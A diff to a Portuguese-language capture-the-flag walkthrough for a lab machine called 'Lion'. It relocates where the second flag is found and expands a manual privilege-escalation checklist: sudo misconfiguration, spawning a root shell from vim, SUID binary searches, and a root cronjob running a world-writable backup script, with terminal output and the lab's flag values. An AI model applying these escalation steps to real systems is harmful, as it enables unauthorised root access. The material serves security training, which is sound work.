@@ -662,10 +662,6 @@ Descobri que a query tem **7 colunas**. Agora preciso confirmar com UNION SELECT
 
 Quando a página carrega, olho onde os números aparecem. No caso da Lion, o número **2** aparece claramente no lugar onde antes tinha o título da notícia da aba de busca. Isso significa que a **coluna 2 é a visível** - é lá que vou injetar minhas queries pra extrair dados.
 
-E adivinha? Ao conseguir fazer o UNION SELECT funcionar, já conseguimos a **segunda flag**:
-
-> **Flag 2:** `uhc{Sql_1nj3ct10n_34sy}`
-
 **Reconhecimento do ambiente:**
 
 Agora que sei que a coluna 2 é a visível, vou usá-la pra extrair informações. Primeiro, descubro o nome do banco:
@@ -824,7 +820,7 @@ Explicando o payload Python:
 
 O navegador fica carregando (travado), mas no nosso terminal onde o Netcat estava ouvindo:
 
-```
+```sh
 ~$ nc -lvnp 4444
 listening on [any] 4444...
 connect to [10.0.30.175] from (UNKNOWN) [172.16.0.48] 40412
@@ -894,6 +890,20 @@ Quando você combina `stty raw -echo` com `fg`, você está basicamente dizendo:
 
 Pronto! Agora temos um shell totalmente interativo com autocomplete (tab), histórico (setas), e podemos usar `clear`, `nano`, `vim`, `su`, etc.
 
+Com isso podemos brincar no terminal a vontade e sem medo de ser feliz.
+
+Se tentarmos listar os arquivos de dentro da raiz do sistema:
+
+```bash
+ls -la /
+```
+
+Encontramos um arquivo com a segunda flag!!
+
+Podemos usar o `cat /flag.txt` para vermos o resultado e já partir para elevação de privilégio em busca da próxima flag.
+
+> **Flag 2:** `uhc{Sql_1nj3ct10n_34sy}`
+
 ### Fase 7: Escalação de Privilégio - Entendendo Cronjobs
 
 Neste momento somos o usuário `apache`, um usuário de baixo privilégio. Nosso objetivo final é ser `root` e ler a flag em `/root/`.
@@ -901,7 +911,7 @@ Neste momento somos o usuário `apache`, um usuário de baixo privilégio. Nosso
 **O que são Cronjobs?**
 
 Cron é o agendador de tarefas do Linux. Ele permite executar comandos ou scripts automaticamente em horários específicos. Por exemplo:
-- Fazer backup todo dia às 3h da manhã
+- Fazer backup todo dia às 3h da manhã ou a cada minuto
 - Limpar arquivos temporários toda hora
 - Enviar relatórios toda segunda-feira
 
@@ -922,21 +932,34 @@ Se um cronjob executa um script como root, e nós conseguimos modificar esse scr
 
 Antes de usar ferramentas automatizadas, é fundamental saber procurar vulnerabilidades manualmente. Nem sempre você conseguirá fazer upload de scripts grandes na máquina vítima, e um pentester de verdade precisa saber encontrar falhas com comandos nativos do sistema.
 
-**Checklist Completo de Escalação Manual:**
+#### Checklist Escalação Manual:
+
+1. **Verificar sudo mal configurado**
+
+Não será utilizado neste caso, visto que entramos como usuário apache, mas não apenas não sabemos a senha dele, como nem sabemos se faz parte de sudoers. 
+De qualquer forma, o comando `sudo -l` lista quais comandos o usuário atual pode executar como root (ou outro usuário). Se aparecer algo como `(ALL) NOPASSWD: /usr/bin/vim`, significa que você pode rodar vim como root sem senha - e do vim você consegue spawnar um shell root com `:!bash`. Isso é algo que pode ser útil em outras ocasiões, mas não para essa máquina.
+
+2. **Procurar binários SUID (Set User ID)**
+
+Geralmente é uma boa opção, este comando será bem utilizado em outras máquinas também.
 
 ```bash
-# 1. Verificar sudo mal configurado
-sudo -l
-```
-
-O comando `sudo -l` lista quais comandos o usuário atual pode executar como root (ou outro usuário). Se aparecer algo como `(ALL) NOPASSWD: /usr/bin/vim`, significa que você pode rodar vim como root sem senha - e do vim você consegue spawnar um shell root com `:!bash`.
-
-```bash
-# 2. Procurar binários SUID (Set User ID)
 find / -perm -4000 -type f 2>/dev/null
 ```
 
 Binários com bit SUID executam com as permissões do **dono** do arquivo, não do usuário que executou. Se `/usr/bin/algo` é SUID e pertence ao root, ele roda como root mesmo quando você executa. Binários SUID "estranhos" (não-padrão) são goldmines para privesc. Sites como [GTFOBins](https://gtfobins.github.io/) listam como explorar vários deles.
+
+O `find /` indica que o comando find vai buscar a partir do diretório raiz, percorrendo todo o sistema de arquivos.
+
+O `-perm -4000` filtra os resultados para incluir APENAS arquivos com o bit SUID habilitado. O valor 4000 é permissão SUID, quando esse bit está ativo o programa roda com o UID efetivo do dono do arquivo (root, por exemplo), indepentemente de quem o executa.
+
+Já o `-type f` restringe para buscar arquivos (files) regulares, e não diretórios ou links.
+
+O redirecionamento com `2>/dev/null` é basicamente para **não printar os erros**. `2` é o descritor de arquivo do `stder` (saída de erro padrão), e o operador `>` é o de redirecionamento, que nesse caso vai para `/dev/null/`, que é um dispositivo especial que descarta tudo o que recebe.
+
+Aqui já temos um resultado lindo e podemos progredir.
+
+#### Continuando checklist para fins de curiosidade e aprendizado
 
 ```bash
 # 3. Procurar binários SGID (Set Group ID)
@@ -1003,17 +1026,78 @@ ps aux | grep root
 
 Às vezes há processos rodando como root que você pode manipular ou que têm vulnerabilidades conhecidas.
 
-**No caso da Lion:**
+#### No caso da Lion:
 
-O comando que encontra a vulnerabilidade diretamente é:
+Os comandos que encontram a vulnerabilidade diretamente é:
 
 ```bash
+find / -perm -4000 -type f 2>/dev/null
+#/usr/bin/crontab avistado
+#buscar config
+find / -type d -iname "contrab" 2>/dev/null
+#ou já sabendo da localização padrão de contrab em /etc/
+cat /etc/crontab
+#podendo tbm achar o script de backup com
 find / -type f -iname "*backup*.sh" 2>/dev/null
 ```
 
-Ele retorna: `/opt/lion/lion.backup.sh` - um script de backup que, como veremos, tem permissões perigosas.
+Ele retorna: `/opt/lion/lion.backup.sh` - um script de backup que será nossa porta de entrada.
 
-> **Nota:** Esse comando é bem específico (procura por `.sh` com "backup" no nome). Se não encontrasse nada, teríamos que tentar os outros comandos da lista. A escalação manual é um processo de tentativa e erro - você vai testando vetores até encontrar um que funcione.
+```
+bash-4.2$ find / -perm -4000 -type f 2>/dev/null
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/crontab
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/at
+/usr/bin/atq
+/usr/bin/staprun
+/usr/sbin/pam_timestamp_check
+/usr/sbin/unix_chkpwd
+/usr/sbin/usernetctl
+/usr/sbin/userhelper
+/usr/sbin/mount.nfs
+/usr/libexec/dbus-daemon-launch-helper
+/usr/libexec/pt_chown
+
+bash-4.2$ cat /etc/crontab
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+# For details see man 4 crontabs
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name  command to be executed
+
+* * * * * root /opt/lion/lion.backup.sh
+
+bash-4.2$ find / -type f -iname "*backup*.sh" 2>/dev/null
+/opt/lion/lion.backup.sh
+bash-4.2$ ls -la /opt/lion/lion.backup.sh
+-rwxrwxrwx 1 root root ... lion.backup.sh
+```
+
+> * * * * * root /opt/lion/lion.backup.sh | Cron com permissão 777
+
+Teremos nossa execução por executar sempre como root e pode ser editado por usuário comum:
+
+**Analisando as permissões:**
+- Primeiro caractere: `-` = arquivo regular
+- `rwx` (posições 2-4): dono (root) pode ler, escrever, executar
+- `rwx` (posições 5-7): grupo pode ler, escrever, executar
+- `rwx` (posições 8-10): **OUTROS** podem ler, escrever, executar!
 
 ### Fase 9: Usando linPEAS para Confirmar (Automatizado)
 
@@ -1079,8 +1163,8 @@ ls -la /opt/lion/lion.backup.sh
 
 Saída: `-rwxrwxrwx 1 root root ... lion.backup.sh`
 
-**Analisando as permissões:**
-- Primeiro caractere: `-` = arquivo regular
+**Como vimos anteriormente ao analisando as permissões:**
+
 - `rwx` (posições 2-4): dono (root) pode ler, escrever, executar
 - `rwx` (posições 5-7): grupo pode ler, escrever, executar
 - `rwx` (posições 8-10): **OUTROS** podem ler, escrever, executar!
@@ -1149,11 +1233,11 @@ Completamos a máquina! 🎉
 1. **Enumeração** - Nmap (portas/serviços) + ffuf (diretórios)
 2. **Flag 1** - Erro de busca: `uhc{1nv4l1d_s3arch_qu3ry}`
 3. **SQLi com UNION** - Descobrimos 7 colunas com ORDER BY e UNION SELECT
-4. **Flag 2** - SQL Injection funcionando: `uhc{Sql_1nj3ct10n_34sy}`
-5. **Enumeração do banco** - Extraímos nome do banco, tabelas, colunas e hash Bcrypt
-6. **RCE via INTO OUTFILE** - Criamos webshell em `/includes/cmd.php`
-7. **Reverse Shell** - Python payload para conexão reversa
-8. **TTY Upgrade** - Shell interativa com `stty raw -echo`
+4. **Enumeração do banco** - Extraímos nome do banco, tabelas, colunas e hash Bcrypt
+5. **RCE via INTO OUTFILE** - Criamos webshell em `/includes/cmd.php`
+6. **Reverse Shell** - Python payload para conexão reversa
+7. **TTY Upgrade** - Shell interativa com `stty raw -echo`
+8. **Flag 2** - SQL Injection funcionando: `uhc{Sql_1nj3ct10n_34sy}`
 9. **Escalação Manual** - Checklist completo de privesc (SUID, crontabs, arquivos graváveis, etc.)
 10. **linPEAS** - Confirmação automatizada do vetor de ataque
 11. **Root via Cronjob** - Modificamos script de backup, ganhamos root
